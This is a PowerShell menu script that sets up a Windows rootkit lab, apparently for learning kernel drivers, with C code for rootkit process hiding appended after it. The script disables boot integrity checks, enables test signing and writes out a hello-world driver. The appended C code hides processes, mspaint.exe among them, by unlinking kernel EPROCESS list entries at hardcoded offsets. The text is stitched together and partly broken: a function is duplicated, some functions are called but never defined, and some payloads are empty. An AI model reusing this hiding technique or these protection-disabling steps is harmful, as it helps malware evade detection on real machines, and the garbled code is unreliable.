
function Show-Menu {
    Clear-Host
    Write-Host "=== Options ==="
    Write-Host "1. Requirements -> Visual Studio 2022 Community + SDK + WDK"
    Write-Host "2. Set Up Environment -> Debugging and Signing Mode"
    Write-Host "3. Debug -> WinDbg Preview"
    Write-Host "4. Tools -> Microsoft Sysinternals Suite + OSR Driver Loader"
    Write-Host "5. Kernel-Mode Driver -> Hello World"
    Write-Host "Q. Exit"
    Write-Host "============"
}



function OptionRequirements {

    Write-Host "You have selected the option 'Requirements -> Visual Studio 2022 Community + SDK + WDK'" -ForegroundColor Green
	$response = Read-Host "Do you want to proceed? (Press 'Y')"
	if ($response -eq "Y") {

        $folderEnvironmentBinaries = "BinariesToInstallEnvironmentDebuggingAndRootkits"
        $folderEnvironmentBinariesPath = Join-Path -Path $PWD -ChildPath $folderEnvironmentBinaries
        New-Item -ItemType Directory -Path $folderEnvironmentBinariesPath | Out-Null
        
        $install = Read-Host "Do you want to install Visual Studio? (Y/N)"
            if ($install -eq "Y") {
                Write-Host "Installing Visual Studio 2022 Community" -ForegroundColor Magenta
                Write-Host "The Visual Studio installer can be found at the following link 'https://visualstudio.microsoft.com/vs/community/'" -ForegroundColor Yellow
                Write-Host "1. Under the 'Workloads' section -> 'Desktop & Mobile', select 'Desktop development with C++'" -ForegroundColor Yellow
                Write-Host "2. Look for the 'Individual components' section located as the second option in the top left and select 'MSVC v143 - VS 2022 C++ x64/x86 Spectre-mitigated libs (latest)'" -ForegroundColor Yellow
                Write-Host "3. Install Visual Studio" -ForegroundColor Yellow

                Invoke-WebRequest -Uri "https://c2rsetup.officeapps.live.com/c2r/downloadVS.aspx?sku=community&channel=Release&version=VS2022&source=VSLandingPage&cid=2030:187d05eef44542af9af15d583bb0214f" -OutFile $folderEnvironmentBinariesPath\VisualStudioSetup.exe
                $process = Start-Process -FilePath $folderEnvironmentBinariesPath\VisualStudioSetup.exe -PassThru
                $process.WaitForExit()
                while ($true) {
                    $response = Read-Host "Visual Studio installation completed? (Y/N)"
                    if ($response -eq "Y") {
                        break
                    }
                }
            }

        
        $install = Read-Host "Do you want to install Windows Software Development Kit (SDK)? (Y/N)"
        if ($install -eq "Y") {
            Write-Host "Installing Windows Software Development Kit (SDK)" -ForegroundColor Magenta
            Write-Host "SDK installer can be found at the following link 'https://developer.microsoft.com/en-us/windows/downloads/windows-sdk/'" -ForegroundColor Yellow
            
            Invoke-WebRequest -Uri "https://download.microsoft.com/download/3/b/d/3bd97f81-3f5b-4922-b86d-dc5145cd6bfe/windowssdk/winsdksetup.exe" -OutFile $folderEnvironmentBinariesPath\winsdksetup.exe
            $process = Start-Process -FilePath $folderEnvironmentBinariesPath\winsdksetup.exe -PassThru
            $process.WaitForExit()
            while ($true) {
                $response = Read-Host "Windows Software Development Kit installation completed? (Y/N)"
                if ($response -eq "Y") {
                    break
                }
            }
        }
        
        $install = Read-Host "Do you want to install Windows Driver Kit (WDK)? (Y/N)"
        if ($install -eq "Y") {
            Write-Host "Installing Windows Driver Kit (WDK)" -ForegroundColor Magenta
            Write-Host "WDK installer can be found at the following links 'https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk' and 'https://learn.microsoft.com/en-us/windows-hardware/drivers/other-wdk-downloads'" -ForegroundColor Yellow
            Write-Host "1. Select 'Windows Driver Kit Visual Studio extension' to complete the integration with Visual Studio" -ForegroundColor Yellow
            
            Invoke-WebRequest -Uri "https://download.microsoft.com/download/7/b/f/7bfc8dbe-00cb-47de-b856-70e696ef4f46/wdk/wdksetup.exe" -OutFile $folderEnvironmentBinariesPath\wdksetup.exe
            $process = Start-Process -FilePath $folderEnvironmentBinariesPath\wdksetup.exe -PassThru
            $process.WaitForExit()
            while ($true) {
                $response = Read-Host "Windows Driver Kit installation completed? (Y/N)"
                if ($response -eq "Y") {
                    break
                }
            }
        }

        Remove-Item $folderEnvironmentBinariesPath -Recurse
    }
}



function OptionEnvironmentDebuggingAndRootkits {

    Write-Host "You have selected the option 'Set Up Environment -> Debugging and Signing Mode'" -ForegroundColor Green
	$response = Read-Host "Do you want to proceed? (Press 'Y')"
	if ($response -eq "Y") {
		
        $install = Read-Host "Do you want to enable debugging? (Y/N)"
		if ($install -eq "Y") {
            Write-Host "Enabling debugging on the machine" -ForegroundColor Magenta
            Invoke-Expression -Command "bcdedit -debug on"
        }

        $install = Read-Host "Do you want to enable test mode? (Y/N)"
		if ($install -eq "Y") {
            Write-Host "Enabling Windows Test Signing Mode" -ForegroundColor Magenta
            Invoke-Expression -Command "bcdedit /set testsigning on"
        }

        $install = Read-Host "Do you want to disable integrity checks? (Y/N)"
		if ($install -eq "Y") {
            Write-Host "Disabling integrity checks" -ForegroundColor Magenta
            Invoke-Expression -Command "bcdedit /set nointegritychecks on"
        }
	}
}



function OptionTools {

    Write-Host "You have selected the option 'Tools -> Microsoft Sysinternals Suite + OSR Driver Loader'" -ForegroundColor Green
	$response = Read-Host "Do you want to proceed? (Press 'Y')"
	if ($response -eq "Y") {

        $folderTools = "Tools"
		$folderToolsPath = Join-Path -Path $PWD -ChildPath $folderTools
        New-Item -ItemType Directory -Path $folderToolsPath | Out-Null

		$install = Read-Host "Do you want to download Microsoft Sysinternals Suite Tools? (Y/N)"
		if ($install -eq "Y") {
			if (-not (Test-Path -Path $folderToolsPath\SysinternalsSuite)) {

                Write-Host "Downloading Microsoft Sysinternals Suite" -ForegroundColor Magenta

                Invoke-WebRequest -Uri "https://download.sysinternals.com/files/SysinternalsSuite.zip" -OutFile $folderToolsPath\master.zip
                Expand-Archive -Path $folderToolsPath\master.zip -DestinationPath $folderToolsPath\SysinternalsSuite
                Remove-Item $folderToolsPath\master.zip
			} else {
				Write-Host "The folder '$folderToolsPath\SysinternalsSuite' already exists in this directory. Unable to proceed." -ForegroundColor Red
			}
		}

        $install = Read-Host "Do you want to download OSR Driver Loader? (Y/N)"
		if ($install -eq "Y") {
			if (-not (Test-Path -Path $folderToolsPath\OSRDriverLoader)) {

                Write-Host "Downloading Microsoft Sysinternals Suite" -ForegroundColor Magenta

                Invoke-WebRequest -Uri "https://www.osronline.com/OsrDown.cfm/osrloaderv30.zip" -OutFile $folderToolsPath\master.zip
                Expand-Archive -Path $folderToolsPath\master.zip -DestinationPath $folderToolsPath\OSRDriverLoader
                Remove-Item $folderToolsPath\master.zip
			} else {
				Write-Host "The folder '$folderToolsPath\OSRDriverLoader' already exists in this directory. Unable to proceed." -ForegroundColor Red
			}
		}


        
    }
}



function OptionKernelModeDriverHellowWorld {

    Write-Host "You have selected the option 'Kernel-Mode Driver -> Hello World'" -ForegroundColor Green
	$response = Read-Host "Do you want to proceed? (Press 'Y')"
	if ($response -eq "Y") {
        Write-Host "Creating files" -ForegroundColor Magenta

		$folderDriverHello = "KMDF1DriverHelloWorld"
		$folderDriverHelloPath = Join-Path -Path $PWD -ChildPath $folderDriverHello
		New-Item -ItemType Directory -Path $folderDriverHelloPath | Out-Null

        $folderDriverHelloDirDriver = "Driver"
        $folderDriverDirDriverPath = Join-Path -Path $folderDriverHelloPath -ChildPath $folderDriverHelloDirDriver
        New-Item -ItemType Directory -Path $folderDriverDirDriverPath | Out-Null

		$contentDrivercHello = "I2luY2x1ZGUgPG50ZGRrLmg+CgoKVk9JRCBEcml2ZXJVbmxvYWQoX0luXyBQRFJJVkVSX09CSkVDVCBwRHJpdmVyT2JqZWN0KQp7CiAgICBVTlJFRkVSRU5DRURfUEFSQU1FVEVSKHBEcml2ZXJPYmplY3QpOwoKICAgIERiZ1ByaW50KCJSb290a2l0IFBPQzogVW5sb2FkaW5nLi4uIFNlcnZpY2UgaGFzIHN0b3BwZWQiKTsKfQoKCk5UU1RBVFVTIERyaXZlckVudHJ5KF9Jbl8gUERSSVZFUl9PQkpFQ1QgcERyaXZlck9iamVjdCwgX0luXyBQVU5JQ09ERV9TVFJJTkcgcFJlZ2lzdHJ5UGF0aCkKewogICAgVU5SRUZFUkVOQ0VEX1BBUkFNRVRFUihwUmVnaXN0cnlQYXRoKTsKCiAgICBwRHJpdmVyT2JqZWN0LT5Ecml2ZXJVbmxvYWQgPSBEcml2ZXJVbmxvYWQ7CgogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DOiBMb2FkaW5nLi4uIEhlbGxvIFdvcmxkIik7CgogICAgcmV0dXJuIFNUQVRVU19TVUNDRVNTOwp9Cg=="
		$contentDrivercHelloDecode = [System.Convert]::FromBase64String($contentDrivercHello)
		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\1DriverHelloWorld.c", $contentDrivercHelloDecode)

		$contentDrivercHelloComments = "LyoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCi8vIE5hbWU6IEtNREYxRHJpdmVySGVsbG9Xb3JsZAovLyBWaXN1YWwgU3R1ZGlvIFByb2plY3Q6IFRlbXBsYXRlIC0+IEtlcm5lbCBNb2RlIERyaXZlciwgRW1wdHkgKEtNREYpCi8vIFNvdXJjZSBDb2RlOgovLyBodHRwczovL2xlYXJuLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1oYXJkd2FyZS9kcml2ZXJzL2dldHRpbmdzdGFydGVkL3dyaXRpbmctYS12ZXJ5LXNtYWxsLWttZGYtLWRyaXZlcgoKLy8gTWFpbiBsaWJyYXJ5IGluY2x1ZGluZyB0aGUgbmVjZXNzYXJ5IGRlZmluaXRpb25zIGZvciBkcml2ZXIgZGV2ZWxvcG1lbnQKLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvbnRkZGsvCiNpbmNsdWRlIDxudGRkay5oPgoKLy8gVW5sb2FkIGZ1bmN0aW9uLCBleGVjdXRlZCB3aGVuIHRoZSBkcml2ZXIgc3RvcHMKLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25jLXdkbS1kcml2ZXJfdW5sb2FkClZPSUQgRHJpdmVyVW5sb2FkKAogICAgLy8gUG9pbnRlciB0byBhIERSSVZFUl9PQkpFQ1Qgc3RydWN0dXJlIHJlcHJlc2VudGluZyB0aGUgZHJpdmVyJ3MgaW1hZ2UgaW4gdGhlIG9wZXJhdGluZyBzeXN0ZW0ga2VybmVsCgkvLyBodHRwczovL2xlYXJuLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1oYXJkd2FyZS9kcml2ZXJzL2RkaS93ZG0vbnMtd2RtLV9kcml2ZXJfb2JqZWN0CiAgICBfSW5fIFBEUklWRVJfT0JKRUNUICAgICBwRHJpdmVyT2JqZWN0CikKewogICAgLy8gUHJldmVudGluZyBjb21waWxlciB3YXJuaW5ncyBmb3IgdW51c2VkIHBEcml2ZXJPYmplY3QgcGFyYW1ldGVyCiAgICBVTlJFRkVSRU5DRURfUEFSQU1FVEVSKHBEcml2ZXJPYmplY3QpOwogICAgCiAgICAvLyBQcmludGluZyBhIG1lc3NhZ2Ugd2hlbiB0aGUgc2VydmljZSBzdG9wcwoJLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25mLXdkbS1kYmdwcmludAogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DOiBVbmxvYWRpbmcuLi4gU2VydmljZSBoYXMgc3RvcHBlZCIpOwp9CgovLyBFbnRyeSBwb2ludCBmb3IgYSBXaW5kb3dzIGtlcm5lbCBtb2RlIGRyaXZlciwgYWtpbiB0byAnbWFpbicgaW4gQyBvciBQeXRob24KLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy93ZGYvZHJpdmVyZW50cnktZm9yLWttZGYtZHJpdmVycwpOVFNUQVRVUyBEcml2ZXJFbnRyeSgKICAgIC8vIFBvaW50ZXIgdG8gYSBEUklWRVJfT0JKRUNUIHN0cnVjdHVyZSByZXByZXNlbnRpbmcgdGhlIGRyaXZlcidzIGltYWdlIGluIHRoZSBvcGVyYXRpbmcgc3lzdGVtIGtlcm5lbAoJLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25zLXdkbS1fZHJpdmVyX29iamVjdAogICAgX0luXyBQRFJJVkVSX09CSkVDVCAgICAgcERyaXZlck9iamVjdCwKICAgIC8vIFBvaW50ZXIgdG8gYSBVTklDT0RFX1NUUklORyBzdHJ1Y3R1cmUsIGNvbnRhaW5pbmcgdGhlIGRyaXZlcidzIHJlZ2lzdHJ5IHBhdGggYXMgYSBVbmljb2RlIHN0cmluZywgaW5kaWNhdGluZyB0aGUgZHJpdmVyJ3MgbG9jYXRpb24gaW4gdGhlIFdpbmRvd3MgcmVnaXN0cnkKCS8vIGh0dHBzOi8vbGVhcm4ubWljcm9zb2Z0LmNvbS9lbi11cy93aW5kb3dzL3dpbjMyL2FwaS9udGRlZi9ucy1udGRlZi1fdW5pY29kZV9zdHJpbmcKICAgIF9Jbl8gUFVOSUNPREVfU1RSSU5HICAgIHBSZWdpc3RyeVBhdGgKKQp7CiAgICAvLyBQcmV2ZW50aW5nIGNvbXBpbGVyIHdhcm5pbmdzIGZvciB1bnVzZWQgcFJlZ2lzdHJ5UGF0aCBwYXJhbWV0ZXIKICAgIFVOUkVGRVJFTkNFRF9QQVJBTUVURVIocFJlZ2lzdHJ5UGF0aCk7CiAgICAKICAgIC8vIFNldHRpbmcgdGhlIHVubG9hZCByb3V0aW5lCgkvLyBodHRwczovL2xlYXJuLm1pY3Jvc29mdC5jb20vZW4tdXMvd2luZG93cy1oYXJkd2FyZS9kcml2ZXJzL2RkaS93ZG0vbmMtd2RtLWRyaXZlcl91bmxvYWQKICAgIHBEcml2ZXJPYmplY3QtPkRyaXZlclVubG9hZCA9IERyaXZlclVubG9hZDsKCiAgICAvLyBQcmludGluZyBhIG1lc3NhZ2UgdG8gaW5kaWNhdGUgdGhhdCB0aGUgZHJpdmVyIGhhcyBiZWVuIGxvYWRlZAoJLy8gaHR0cHM6Ly9sZWFybi5taWNyb3NvZnQuY29tL2VuLXVzL3dpbmRvd3MtaGFyZHdhcmUvZHJpdmVycy9kZGkvd2RtL25mLXdkbS1kYmdwcmludAogICAgRGJnUHJpbnQoIlJvb3RraXQgUE9DOiBMb2FkaW5nLi4uIEhlbGxvIFdvcmxkIik7CgogICAgLy8gU3VjY2Vzc2Z1bCBkcml2ZXIgaW5pdGlhbGl6YXRpb24KICAgIHJldHVybiBTVEFUVVNfU1VDQ0VTUzsKfQoKLy8gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KKi8K"
		$contentDrivercHelloCommentsDecode = [System.Convert]::FromBase64String($contentDrivercHelloComments)
		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\2DriverHelloWorldComments.c", $contentDrivercHelloCommentsDecode)

		$contentDrivercHelloReadme = "IyMjIEhvdyB0byBUZXN0IHRoZSBEcml2ZXIKCjEuIEJ1aWxkIHRoZSBTb2x1dGlvbjoKICAgIC0gQnVpbGQgLT4gQnVpbGQgU29sdXRpb24KCjIuIE9wZW4gRGVidWdWaWV3IGFzIGFuIEFkbWluaXN0cmF0b3I6CiAgICAtIEVuYWJsZSBvcHRpb25zICgiQ2FwdHVyZSAtPiBDYXB0dXJlIEtlcm5lbCIgYW5kICJDYXB0dXJlIC0+IEVuYWJsZSBWZXJib3NlIEtlcm5lbCBPdXRwdXQiKQoKMy4gT3BlbiBQb3dlclNoZWxsIGFzIGFuIEFkbWluaXN0cmF0b3IgYW5kIHJ1biB0aGUgZm9sbG93aW5nIGNvbW1hbmRzOgogICAgLSAuXHNjLmV4ZSBzdG9wIEtNREYxRHJpdmVySGVsbG9Xb3JsZAogICAgLSAuXHNjLmV4ZSBkZWxldGUgS01ERjFEcml2ZXJIZWxsb1dvcmxkCiAgICAtIC5cc2MuZXhlIGNyZWF0ZSBLTURGMURyaXZlckhlbGxvV29ybGQgdHlwZT1rZXJuZWwgc3RhcnQ9ZGVtYW5kIGJpbnBhdGg9IkM6XFVzZXJzXHVzZXIxXFNvdXJjZVxSZXBvc1xLTURGMURyaXZlckhlbGxvV29ybGRceDY0XERlYnVnXEtNREYxRHJpdmVySGVsbG9Xb3JsZC5zeXMiCiAgICAtIC5cc2MuZXhlIHN0YXJ0IEtNREYxRHJpdmVySGVsbG9Xb3JsZAoKNC4gT2JzZXJ2ZSBNZXNzYWdlcyBpbiBEZWJ1Z1ZpZXc6CiAgICAtIE1vbml0b3IgdGhlIG91dHB1dCBpbiBEZWJ1Z1ZpZXcgZm9yIGFueSBkcml2ZXIgbWVzc2FnZXMuCg=="
		$contentDrivercHelloReadmeDecode = [System.Convert]::FromBase64String($contentDrivercHelloReadme)
		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\3DriverHelloWorldReadme.md", $contentDrivercHelloReadmeDecode)
    }
}


function OptionKernelModeDriverHelloWorldCommunication {

    Write-Host "You have selected the option 'Kernel-Mode Driver -> Hello World Communication'" -ForegroundColor Green
	$response = Read-Host "Do you want to proceed? (Press 'Y')"
	if ($response -eq "Y") {
        Write-Host "Creating files" -ForegroundColor Magenta

		$folderDriverHello = "KMDF2DriverHelloWorldCommunication"
		$folderDriverHelloPath = Join-Path -Path $PWD -ChildPath $folderDriverHello
		New-Item -ItemType Directory -Path $folderDriverHelloPath | Out-Null

        $folderDriverHelloDirApplication = "Application"
        $folderDriverDirApplicationPath = Join-Path -Path $folderDriverHelloPath -ChildPath $folderDriverHelloDirApplication
        New-Item -ItemType Directory -Path $folderDriverDirApplicationPath | Out-Null

        $folderDriverHelloDirDriver = "Driver"
        $folderDriverDirDriverPath = Join-Path -Path $folderDriverHelloPath -ChildPath $folderDriverHelloDirDriver
        New-Item -ItemType Directory -Path $folderDriverDirDriverPath | Out-Null

		$contentDrivercHello = ""
		$helloDrivercBytes = [System.Convert]::FromBase64String($contentDrivercHello)
		[System.IO.File]::WriteAllBytes("$folderDriverDirApplicationPath\1ApplicationHelloWorldCommunication.c", $helloDrivercBytes)

        $contentUsercHello = ""
		$helloUsercBytes = [System.Convert]::FromBase64String($contentUsercHello)
		[System.IO.File]::WriteAllBytes("$folderDriverDirDriverPath\1DriverHelloWorldCommunication.c", $helloUsercBytes)
		
		
		$contentDrivercHelloReadme = "IyMjIEhvdyB0byBUZXN0IHRoZSBEcml2ZXIKCjEuIEJ1aWxkIHRoZSBTb2x1dGlvbjoKICAgIC0gQnVpbGQgLT4gQnVpbGQgU29sdXRpb24KCjIuIE9wZW4gRGVidWdWaWV3IGFzIGFuIEFkbWluaXN0cmF0b3I6CiAgICAtIEVuYWJsZSBvcHRpb25zIChDYXB0dXJlIC0+IENhcHR1cmUgS2VybmVsIGFuZCBDYXB0dXJlIC0+IEVuYWJsZSBWZXJib3NlIEtlcm5lbCBPdXRwdXQpCgozLiBPcGVuIFBvd2VyU2hlbGwgYXMgYW4gQWRtaW5pc3RyYXRvciBhbmQgcnVuIHRoZSBmb2xsb3dpbmcgY29tbWFuZHM6CiAgICAtIC5cc2MuZXhlIHN0b3AgS01ERkRyaXZlcjFIZWxsb1dvcmxkCiAgICAtIC5cc2MuZXhlIGRlbGV0ZSBLTURGRHJpdmVyMUhlbGxvV29ybGQKICAgIC0gLlxzYy5leGUgY3JlYXRlIEtNREZEcml2ZXIxSGVsbG9Xb3JsZCB0eXBlPWtlcm5lbCBzdGFydD1kZW1hbmQgYmlucGF0aD0iQzpcVXNlcnNcdXNlcjFcU291cmNlXFJlcG9zXEtNREZEcml2ZXIxSGVsbG9Xb3JsZFx4NjRcRGVidWdcS01ERkRyaXZlcjFIZWxsb1dvcmxkLnN5cyIKICAgIC0gLlxzYy5leGUgc3RhcnQgS01ERkRyaXZlcjFIZWxsb1dvcmxkCgo0LiBPYnNlcnZlIE1lc3NhZ2VzIGluIERlYnVnVmlldzoKICAgIC0gTW9uaXRvciB0aGUgb3V0cHV0IGluIERlYnVnVmlldyBmb3IgYW55IGRyaXZlciBtZXNzYWdlcy4K"
		$helloExecuteBytes = [System.Convert]::FromBase64String($contentDrivercHelloReadme)
		[System.IO.File]::WriteAllBytes("$folderDriverHelloPath\DriverUserHelloWorldReadme.md", $helloExecuteBytes)
    }
}


do {
    Show-Menu
    $choice = Read-Host "Choose an option"
    switch ($choice) {
        '1' { OptionRequirements }
        '2' { OptionEnvironmentDebuggingAndRootkits }
        '3' { OptionWindbg }
        '4' { OptionTools }
        '5' { OptionKernelModeDriverHellowWorld }
        'Q' { break }
        default { Write-Host "Invalid option. Please choose again." }
    }
    Write-Host "Press any key to continue..."
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
} while ($choice -ne 'Q')





VOID AvoidBSOD_RemoveProcessLinks(
PLIST_ENTRY CurrListEntry
)
{
    PLIST_ENTRY Previous, Next;
    Previous = (CurrListEntry->Blink);
    Next = (CurrListEntry->Flink);

	DbgPrint("AvoidBSOD_RemoveProcessLinks -> Remove entry list");
    Previous->Flink = Next;
    Next->Blink = Previous;

	DbgPrint("AvoidBSOD_RemoveProcessLinks -> Re-write the current LIST_ENTRY to point to itself (A way to avoid BSOD)");
    CurrListEntry->Blink = (PLIST_ENTRY)&CurrListEntry->Flink;
    CurrListEntry->Flink = (PLIST_ENTRY)&CurrListEntry->Flink;
    return;
}


VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
    _In_ UINT32 pid
)
{
    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;

    UINT32* currUniqueProcessId = NULL;
    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;

    PEPROCESS CurrentProcess = PsGetCurrentProcess();

    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    while (CurrListEntry != PrevListEntry)
    {
        NextListEntry = CurrListEntry->Flink;
        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);

        if (*(UINT32*)currUniqueProcessId == pid && MmIsAddressValid(CurrListEntry))
        {
            DbgPrint("Hide Process: Pid (%p)", currUniqueProcessId);
            RemoveTheLinks(CurrListEntry);
        }

        CurrListEntry = NextListEntry;
    }
}


VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
    _In_ char* ProcessName
)
{
    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;

    char* currImageFileName = NULL;
    ULONG_PTR WinDbgEPROCESSImageFileNameOffset = 0x5a8;

    UINT32* currUniqueProcessId = NULL;
    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;

    PEPROCESS CurrentProcess = PsGetCurrentProcess();

    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    while (CurrListEntry != PrevListEntry)
    {
        NextListEntry = CurrListEntry->Flink;
        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);
        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);

        if (strcmp(currImageFileName, "mspaint.exe") == 0 && MmIsAddressValid(CurrListEntry))
        {
            DbgPrint("Hide Process: Name (%s), PID (%p)", currImageFileName, currUniqueProcessId);
            RemoveEntryList(CurrListEntry);
        }

        CurrListEntry = NextListEntry;
    }
}

VOID WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
    _In_ char* ProcessName
)
{
    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;

    char* currImageFileName = NULL;
    ULONG_PTR WinDbgEPROCESSImageFileNameOffset = 0x5a8;

    UINT32* currUniqueProcessId = NULL;
    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;

    PEPROCESS CurrentProcess = PsGetCurrentProcess();

    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    while (CurrListEntry != PrevListEntry)
    {
        NextListEntry = CurrListEntry->Flink;
        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);
        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);

        if (strcmp(currImageFileName, "mspaint.exe") == 0 && MmIsAddressValid(CurrListEntry))
        {
            DbgPrint("Hide Process: Name (%s), PID (%p)", currImageFileName, currUniqueProcessId);
            RemoveEntryList(CurrListEntry);
        }

        CurrListEntry = NextListEntry;
    }
}



